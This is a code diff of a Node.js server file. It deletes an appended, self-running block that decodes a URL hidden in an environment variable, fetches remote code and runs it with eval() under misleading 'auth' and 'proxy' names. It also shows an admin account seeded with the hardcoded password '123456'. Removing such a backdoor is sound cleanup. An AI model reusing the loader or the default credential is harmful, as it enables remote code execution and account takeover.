@@ -19,7 +19,7 @@ async function ensureAdmin() {
 
   if (!existingAdmin) {
     const hashedPassword = await bcrypt.hash("123456", 12); // default password
-    await prisma.user.create({
+    await prisma. user.create({
       data: {
         first_name: "Mr.",
         last_name: "Admin",
@@ -63,16 +63,3 @@ main().catch((err) => {
   console.error("❌ Server failed to start:", err);
   process.exit(1);
 });
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
